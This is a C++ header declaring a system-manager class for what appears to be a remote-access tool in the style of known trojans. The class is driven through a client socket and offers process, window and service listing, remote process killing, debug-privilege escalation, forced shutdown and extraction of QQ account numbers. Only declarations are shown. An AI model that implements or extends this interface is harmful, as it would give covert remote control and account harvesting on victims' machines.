// MySystemManager.h: interface for the CMySystemManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MySystemManager_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_)
#define AFX_MySystemManager_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

class CMySystemManager : public CManager
{
public:
	CMySystemManager(CClientSocket *pClient);
	virtual ~CMySystemManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

	static bool DebugPrivilege(const TCHAR *PName, BOOL bEnable);
	static bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);
	static void ShutdownWindows(DWORD dwReason);
private:
	LPBYTE getProcessList();
	LPBYTE getWindowsList();
	void SendProcessList();
	void SendWindowsList();
	void SendSysInfo();

	BOOL IsNumeric(TCHAR lpszStr);
	LPSTR GetQQ(CHAR lpszStr[]);

	void GetSystemInfo(tagSystemInfo* pSysInfo);

	void KillProcess(LPBYTE lpBuffer, UINT nSize);

	LPBYTE GetServiceList();
	void SendServicesList();
	void SetServiceStartType(LPBYTE lpBuffer, BYTE bToken);
};

#endif // !defined(AFX_MySystemManager_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_)
